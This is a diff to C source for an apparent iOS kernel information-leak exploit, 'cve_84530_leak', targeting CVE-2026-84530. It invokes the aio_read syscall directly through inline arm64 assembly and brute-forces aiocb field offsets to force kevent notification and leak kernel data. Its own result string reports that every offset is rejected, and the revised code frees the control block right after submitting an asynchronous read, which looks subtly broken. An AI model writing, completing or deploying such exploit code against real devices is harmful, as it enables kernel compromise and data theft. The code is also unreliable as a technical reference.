@@ -18,20 +18,16 @@ extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
 
 static char g_result[2048];
 
-/* raw arm64 Darwin syscall — bypasses libSystem aio_read wrapper */
-/* On success: x0=0. On error: carry set, x0=errno (positive). */
+/* naked arm64 Darwin raw syscall */
+/* x0 = cb ptr (arg0), x16 = 255 (SYS_aio_read), svc #0x80 */
+/* returns: 0 on success, positive errno on error */
+__attribute__((naked))
 static int raw_aio_read(void *cb) {
-    register long x0  __asm__("x0")  = (long)cb;
-    register long x16 __asm__("x16") = 255; /* SYS_aio_read */
-    __asm__ volatile (
-        "svc #0x80"
-        : "+r"(x0)
-        : "r"(x16)
-        : "memory", "cc",
-          "x1","x2","x3","x4","x5","x6","x7"
+    __asm__(
+        "mov x16, #255\n"
+        "svc #0x80\n"
+        "ret\n"
     );
-    /* x0 = 0 on success, = positive errno on error */
-    return (int)x0;
 }
 
 uint64_t cve_84530_leak(void) {
@@ -44,7 +40,7 @@ uint64_t cve_84530_leak(void) {
         snprintf(tmppath, sizeof(tmppath), "/tmp/aio_%d.bin", (int)getpid());
         wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
     }
-    write(wfd, "CVE-2026-84530", 14);
+    write(wfd, "CVE-2026-84530-TEST", 19);
     close(wfd);
 
     int fd = open(tmppath, O_RDONLY);
@@ -53,13 +49,15 @@ uint64_t cve_84530_leak(void) {
         return 0;
     }
 
-    static char iobuf[64];
+    /* separate buffers for probe vs kevent */
+    static char probe_buf[64];
+    static char kev_buf[64];
 
-    /* SIGEV_NONE via normal libSystem call (works fine) */
+    /* step 1: SIGEV_NONE via libSystem to confirm AIO works */
     struct aiocb probe;
     memset(&probe, 0, sizeof(probe));
     probe.aio_fildes = fd;
-    probe.aio_buf    = iobuf;
+    probe.aio_buf    = probe_buf;
     probe.aio_nbytes = 8;
     probe.aio_offset = 0;
     probe.aio_sigevent.sigev_notify = 0;
@@ -68,24 +66,31 @@ uint64_t cve_84530_leak(void) {
             "SIGEV_NONE failed errno=%d", errno);
         close(fd); return 0;
     }
-    usleep(100000); /* 100ms — no aio_suspend, avoids libSystem tracking */
+    /* properly wait + clean up so libSystem tracking is cleared */
+    const struct aiocb *pl[1] = { &probe };
+    aio_suspend(pl, 1, NULL);
+    aio_return(&probe);
 
-    /* brute force via raw syscall — no libSystem wrapper */
+    /* step 2: SIGEV_KEVENT via raw syscall, brute force offset */
     for (int off = 32; off <= 120; off += 4) {
         int kq = kqueue();
         if (kq < 0) continue;
 
-        static char cb[256];
-        memset(cb, 0, sizeof(cb));
+        /* 256-byte buffer on heap to avoid stack issues */
+        char *cb = (char *)calloc(1, 256);
+        if (!cb) { close(kq); continue; }
+
         *(int      *)(cb +  0) = fd;
         *(int64_t  *)(cb +  8) = 0;
-        *(void    **)(cb + 16) = iobuf;
+        *(void    **)(cb + 16) = kev_buf;
         *(uint64_t *)(cb + 24) = 8;
         *(int      *)(cb + 32) = 0;
         *(int      *)(cb + 40) = SIGEV_KEVENT_VAL;
         *(int      *)(cb + off) = kq;
 
         int ret = raw_aio_read(cb);
+        free(cb);
+
         if (ret == 0) {
             usleep(50000);
             uint8_t ext[4096];
@@ -129,9 +134,9 @@ uint64_t cve_84530_leak(void) {
     }
 
     snprintf(g_result, sizeof(g_result),
-        "SIGEV_NONE OK (libSystem)\n"
-        "raw syscall SIGEV_KEVENT all offsets=%d\n"
-        "kernel rejects SIGEV_KEVENT on iOS 26.5.2", 22);
+        "SIGEV_NONE OK\n"
+        "raw syscall: all offsets EINVAL (errno=22)\n"
+        "kernel rejects SIGEV_KEVENT on this build");
     close(fd);
     return 0;
 }
